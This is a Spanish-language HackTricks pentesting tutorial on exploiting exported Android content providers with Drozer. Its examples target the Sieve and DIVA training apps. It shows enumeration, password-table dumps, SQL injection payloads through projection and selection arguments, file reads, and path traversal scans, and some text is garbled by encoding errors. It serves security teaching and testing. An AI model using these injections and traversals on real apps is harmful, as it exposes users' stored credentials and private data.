## Explotando Proveedores de Contenido

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## IntroducciÃ³n

Un componente proveedor de contenido **proporciona datos de una aplicaciÃ³n a otras** a peticiÃ³n. Dichas solicitudes son manejadas por los mÃ©todos de la clase ContentResolver. Un proveedor de contenido puede utilizar diferentes formas de almacenar sus datos y los datos pueden estar **almacenados** en una **base de datos**, en **archivos**, o incluso en una **red**.

Debe ser declarado dentro del archivo _Manifest.xml_. Ejemplo:
```markup
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
    <path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
En este caso, es necesario el permiso `READ_KEYS` para acceder a `content://com.mwr.example.sieve.DBContentProvider/Keys`. (_TambiÃ©n, observe que en la siguiente secciÃ³n vamos a acceder a `/Keys/` que no estÃ¡ protegido, esto se debe a que el desarrollador se confundiÃ³ y protegiÃ³ `/Keys` pero declarÃ³ `/Keys/`_)

**QuizÃ¡s pueda acceder a datos privados o explotar alguna vulnerabilidad (InyecciÃ³n SQL o Traversal de Ruta).**

## Obtener informaciÃ³n de **proveedores de contenido expuestos**
```
dz> run app.provider.info -a com.mwr.example.sieve 
  Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
  Path: /Keys
  Type: PATTERN_LITERAL
  Read Permission: com.mwr.example.sieve.READ_KEYS
  Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
```
Podemos **reconstruir** parte de las **URI** de contenido para acceder al **DBContentProvider**, porque sabemos que deben comenzar con "_content://_" y la informaciÃ³n obtenida por Drozer dentro de Path: _/Keys_.

Drozer puede **adivinar y probar varias URIs**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
... 
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys 
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
TambiÃ©n debes revisar el **cÃ³digo del ContentProvider** para buscar consultas:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

AdemÃ¡s, si no puedes encontrar consultas completas, puedes **verificar quÃ© nombres son declarados por el ContentProvider** en el mÃ©todo `onCreate`:

![](<../../../.gitbook/assets/image (186).png>)

La consulta serÃ¡ como: `content://nombre.del.paquete.clase/nombre_declarado`

## **Content Providers respaldados por bases de datos**

Probablemente la mayorÃ­a de los Content Providers se utilizan como **interfaz** para una **base de datos**. Por lo tanto, si puedes acceder a ella, podrÃ­as ser capaz de **extraer, actualizar, insertar y eliminar** informaciÃ³n.\
Revisa si puedes **acceder a informaciÃ³n sensible** o intenta cambiarla para **burlar los mecanismos de autorizaciÃ³n**.

Al revisar el cÃ³digo del Content Provider, **busca** tambiÃ©n **funciones** con nombres como: _query, insert, update y delete_:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Porque podrÃ¡s llamarlas.

### Consulta de contenido
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Insertar contenido

Al consultar la base de datos, aprenderÃ¡s el **nombre de las columnas**, luego podrÃ¡s insertar datos en la base de datos:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Nota que en insert y update puedes usar --string para indicar una cadena, --double para indicar un doble, --float, --integer, --long, --short, --boolean_

### Actualizar contenido

Conociendo el nombre de las columnas, tambiÃ©n puedes **modificar las entradas**:

![](<../../../.gitbook/assets/image (190).png>)

### Eliminar contenido

![](<../../../.gitbook/assets/image (191).png>)

### **InyecciÃ³n SQL**

Es fÃ¡cil probar la inyecciÃ³n SQL **(SQLite)** manipulando los campos de **proyecciÃ³n** y **selecciÃ³n** que se pasan al proveedor de contenido.\
Al consultar el proveedor de contenido hay 2 argumentos interesantes para buscar informaciÃ³n: _--selection_ y _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

Puedes intentar **abusar** de estos **parÃ¡metros** para probar las **inyecciones SQL**:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" 
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* 
FROM SQLITE_MASTER WHERE type='table';--" 
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... | 
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Descubrimiento automÃ¡tico de SQLInjection por Drozer**

Drozer is a powerful tool that can be used to discover SQL injection vulnerabilities in Android applications. One of the ways it does this is by exploiting content providers.

Drozer es una herramienta poderosa que se puede utilizar para descubrir vulnerabilidades de inyecciÃ³n SQL en aplicaciones de Android. Una de las formas en que lo hace es explotando proveedores de contenido.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
  
dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
  android_metadata
  notes
  sqlite_sequence
```
## **Proveedores de contenido respaldados por el sistema de archivos**

Los proveedores de contenido tambiÃ©n se pueden utilizar para **acceder a archivos:**

![](<../../../.gitbook/assets/image (193).png>)

### Leer **archivo**

Puede leer archivos desde el proveedor de contenido.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 
127.0.0.1            localhost
```
### **TravesÃ­a de ruta**

Si puedes acceder a archivos, puedes intentar abusar de una TravesÃ­a de ruta (en este caso no es necesario, pero puedes intentar usar "_../_" y trucos similares).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 
127.0.0.1            localhost
```
**Descubrimiento automÃ¡tico de Traversal de ruta por Drozer**

Drozer can be used to automatically discover path traversal vulnerabilities in content providers. The `path_traversal` module can be used to test for these vulnerabilities.

Drozer se puede utilizar para descubrir automÃ¡ticamente vulnerabilidades de Traversal de ruta en proveedores de contenido. El mÃ³dulo `path_traversal` se puede utilizar para probar estas vulnerabilidades.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve 
Scanning com.mwr.example.sieve... 
Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
```
## Referencias

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
